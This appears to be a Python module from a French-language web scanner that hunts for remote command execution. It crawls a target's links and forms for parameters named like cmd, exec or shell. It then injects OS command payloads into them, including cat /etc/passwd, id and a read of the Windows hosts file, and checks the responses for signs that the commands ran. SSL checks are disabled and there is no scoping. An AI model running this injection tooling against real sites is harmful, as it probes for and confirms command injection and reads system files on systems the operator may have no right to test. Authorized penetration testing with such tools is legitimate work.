import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

# 🔍 Liste des paramètres suspects liés à l'exécution de commandes (potentiellement vulnérables à RCE)
RCE_KEYS = [
    "cmd", "exec", "command", "query", "shell", "ping", "process",
    "run", "execute", "operation", "function", "task"
]

# 🎯 Payloads pour tester l'exécution de code (Linux et Windows)
RCE_PAYLOADS = [
    "whoami",  # Identité de l'utilisateur
    "id",  # Vérifier les permissions
    "uname -a",  # Informations système Linux
    "ls -la",  # Liste des fichiers
    "cat /etc/passwd",  # Essayer de lire les utilisateurs Linux
    "echo RCE_TEST",  # Vérifier si l'exécution est possible
    "ping -c 1 127.0.0.1",  # Tester une commande réseau
    "dir",  # Commande Windows
    "type C:\\Windows\\System32\\drivers\\etc\\hosts",  # Lire un fichier Windows
]

def find_rce_in_urls(target):
    """Analyse les liens pour détecter les paramètres RCE potentiels"""
    session = requests.Session()
    session.verify = False  # Ignore les erreurs SSL
    
    try:
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')
        
        detected_params = []
        for link in soup.find_all('a', href=True):
            url = link['href']
            parsed_url = urlparse(url)
            
            if any(param in parsed_url.query for param in RCE_KEYS):
                detected_params.append(url)
        
        return detected_params
    except requests.exceptions.RequestException as e:
        print(f"❌ Erreur lors de la requête : {e}\n")
        return []

def find_rce_in_forms(target):
    """Recherche les formulaires contenant des champs susceptibles d’être vulnérables à RCE"""
    session = requests.Session()
    session.verify = False
    
    try:
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')
        
        detected_forms = []
        for form in soup.find_all('form'):
            action = form.attrs.get("action")
            method = form.attrs.get("method", "get").lower()
            inputs = [input_tag.attrs.get("name") for input_tag in form.find_all("input") if input_tag.attrs.get("name")]
            
            full_action_url = urljoin(target, action) if action else target
            
            if any(param in inputs for param in RCE_KEYS):
                detected_forms.append({"action": full_action_url, "method": method, "inputs": inputs})
        
        return detected_forms
    except requests.exceptions.RequestException as e:
        print(f"❌ Erreur lors de la requête : {e}\n")
        return []

def test_rce(target_url, param, method="get"):
    """Injecte des commandes pour tester une éventuelle exécution de code à distance"""
    for payload in RCE_PAYLOADS:
        test_payload = f"{target_url}&{param}={payload}" if "?" in target_url else f"{target_url}?{param}={payload}"
        
        try:
            response = requests.get(test_payload, timeout=5) if method == "get" else requests.post(target_url, data={param: payload}, timeout=5)
            
            if "RCE_TEST" in response.text or "root:x:0:0" in response.text or "Microsoft Windows" in response.text:
                print(f"🔥 RCE détectée sur {test_payload} !")
                return {"url": test_payload, "rce_exploitable": True}
        except requests.exceptions.RequestException as e:
            print(f"❌ Erreur lors de la requête RCE : {e}")
    
    return None

def scan_rce(target, formated_target):
    """Exécute un scan RCE sur l'URL cible"""
    print(f"\n\t==============Scan RCE sur -->{formated_target}<-- 🔍 ==============\n")
    
    results = {"urls": [], "forms": []}
    
    # 1️⃣ Recherche de paramètres RCE dans les URLs
    urls_with_rce = find_rce_in_urls(target)
    if urls_with_rce:
        print("🚀 Test RCE sur les URLs...")
        for url in urls_with_rce:
            param = url.split("=")[0].split("?")[-1]  # Extrait le nom du paramètre
            result = test_rce(url, param, "get")
            if result:
                results["urls"].append(result)
    
    # 2️⃣ Recherche de champs RCE dans les formulaires
    forms_with_rce = find_rce_in_forms(target)
    if not forms_with_rce:
        print("\n✅ Aucun formulaire détecté avec des paramètres RCE.")
    else:
        print("\n🚀 Test RCE sur les formulaires...")
        for form in forms_with_rce:
            action = form["action"]
            method = form["method"]
            for input_name in form["inputs"]:
                result = test_rce(action, input_name, method)
                if result:
                    results["forms"].append(result)
    
    print("\n✅ Scan RCE terminé.\n")
    
    return results